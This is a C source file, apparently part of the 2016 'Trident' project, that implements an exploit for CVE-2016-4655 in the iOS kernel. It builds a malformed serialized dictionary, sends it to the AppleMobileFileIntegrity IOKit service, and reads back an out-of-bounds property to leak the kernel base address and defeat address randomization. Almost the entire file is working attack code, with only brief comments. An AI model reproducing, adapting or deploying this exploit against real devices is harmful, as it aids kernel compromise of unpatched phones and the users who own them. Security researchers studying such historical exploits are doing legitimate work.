//
//  exploit.c
//  Trident
//
//  Created by Benjamin Randazzo on 06/11/2016.
//  Copyright Â© 2016 Benjamin Randazzo. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>

#include <pthread.h>

#include <sys/syscall.h>
#include <sys/kauth.h>
#include <sys/stat.h>

#include <mach/mach.h>

#include <IOKit/IOKitLib.h>

#include "offsetfinder.h"

#include <dlfcn.h>
#include <asl.h>


enum
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollecton = 0x80000000U,
};

#define kOSSerializeBinarySignature "\323\0\0"


#define WRITE_IN(buf, data) do { *(uint32_t *)(buf+bufpos) = (data); bufpos+=4; } while(0)

typedef void* (*dlopen_ptr)(const char *filename, int flags);
typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
static dlopen_ptr dlopen_func = 0;
static dlsym_ptr dlsym_func = 0;

// CVE-2016-4655
uint32_t leak_kernel_base(void) 
{
  // Lookup functions
  void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);

  typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
  asl_log_ptr asl_log_func = dlsym_func(libsystem, "asl_log");

  typedef void* (*memcpy_ptr)( void * destination, const void * source, size_t num);
  memcpy_ptr memcpy_func = dlsym_func(libsystem, "memcpy");

  void* libIOKit = dlopen_func("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_NOW);

  typedef CFMutableDictionaryRef (*IOServiceMatching_ptr)(const char *name);
  IOServiceMatching_ptr IOServiceMatching_func = dlsym_func(libIOKit, "IOServiceMatching");

  typedef io_service_t (*IOServiceGetMatchingService_ptr)(mach_port_t masterPort, CFDictionaryRef matching);
  IOServiceGetMatchingService_ptr IOServiceGetMatchingService_func = dlsym_func(libIOKit, "IOServiceGetMatchingService");

  typedef mach_port_t (*mach_task_self_ptr)();
  mach_task_self_ptr mach_task_self_func = dlsym_func(libIOKit, "mach_task_self");

  typedef kern_return_t (*io_service_open_extended_ptr)(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);
  io_service_open_extended_ptr io_service_open_extended_func = dlsym_func(libIOKit, "io_service_open_extended");

  typedef kern_return_t (*IORegistryEntryGetChildIterator_ptr)(io_registry_entry_t entry, const io_name_t plane, io_iterator_t *iterator);
  IORegistryEntryGetChildIterator_ptr IORegistryEntryGetChildIterator_func = dlsym_func(libIOKit, "IORegistryEntryGetChildIterator");

  typedef kern_return_t (*IOObjectRelease_ptr)(io_object_t object);
  IOObjectRelease_ptr IOObjectRelease_func = dlsym_func(libIOKit, "IOObjectRelease");

  typedef io_object_t (*IOIteratorNext_ptr)(io_iterator_t iterator);
  IOIteratorNext_ptr IOIteratorNext_func = dlsym_func(libIOKit, "IOIteratorNext");

  typedef kern_return_t (*IORegistryEntryGetProperty_ptr)(io_registry_entry_t entry, const io_name_t propertyName, io_struct_inband_t buffer, uint32_t *size);
  IORegistryEntryGetProperty_ptr IORegistryEntryGetProperty_func = dlsym_func(libIOKit, "IORegistryEntryGetProperty");

  // Exploit
  char data[4096];
  uint32_t bufpos = 0;

  memcpy_func(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
  bufpos += sizeof(kOSSerializeBinarySignature);

  WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollecton | 2);

  WRITE_IN(data, kOSSerializeSymbol | 30);
  WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingSrc"
  WRITE_IN(data, 0x6f627965);
  WRITE_IN(data, 0x4d647261);
  WRITE_IN(data, 0x6669646f);
  WRITE_IN(data, 0x4d726569);
  WRITE_IN(data, 0x69707061);
  WRITE_IN(data, 0x7253676e);
  WRITE_IN(data, 0x00000063);
  WRITE_IN(data, kOSSerializeNumber | 2048);
  WRITE_IN(data, 0x00000004);
  WRITE_IN(data, 0x00000000);

  WRITE_IN(data, kOSSerializeSymbol | 30);
  WRITE_IN(data, 0x4b444948); // "HIDKeyboardModifierMappingDst"
  WRITE_IN(data, 0x6f627965);
  WRITE_IN(data, 0x4d647261);
  WRITE_IN(data, 0x6669646f);
  WRITE_IN(data, 0x4d726569);
  WRITE_IN(data, 0x69707061);
  WRITE_IN(data, 0x7344676e);
  WRITE_IN(data, 0x00000074);
  WRITE_IN(data, kOSSerializeNumber | kOSSerializeEndCollecton | 32);
  WRITE_IN(data, 0x00000193);
  WRITE_IN(data, 0X00000000);

  CFMutableDictionaryRef amfi = IOServiceMatching_func("AppleMobileFileIntegrity");
  io_service_t service = IOServiceGetMatchingService_func(0, amfi);
  io_connect_t connection;
  kern_return_t result;

  NDR_record_t* NDR_record_lookup = dlsym_func(libIOKit, "NDR_record");

  io_service_open_extended_func(service, mach_task_self_func(), 0, *NDR_record_lookup, data, bufpos, &result, &connection);
  if (result != KERN_SUCCESS) {
    /*asl_log_func(0, 0, ASL_LEVEL_ERR, "error!\n");*/
  }

  io_object_t object = 0;
  uint32_t size = sizeof(data);
  io_iterator_t iterator;
  IORegistryEntryGetChildIterator_func(service, "IOService", &iterator);

  do {
    if (object) {
      IOObjectRelease_func(object);
    }
    object = IOIteratorNext_func(iterator);
  } while (IORegistryEntryGetProperty_func(object, "HIDKeyboardModifierMappingSrc", data, &size));

  if (size > 8) {
    return (*(uint32_t *)(data+36) & 0xFFF00000) + 0x1000;
  }
  return 0;
}


void init_exploit(void * dlsym_addr, void * dlopen_addr)
{
  dlopen_func = dlopen_addr;
  dlsym_func = dlsym_addr;

  void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
  typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
  asl_log_ptr asl_log_func = dlsym_func(libsystem, "asl_log");

  for (int i=0;i<10;i++) {
    asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from exploit32!!\n");
  }

  uint32_t kernel_base = leak_kernel_base();

  asl_log_func(0, 0, ASL_LEVEL_ERR, "did leak %p\n", kernel_base);
}


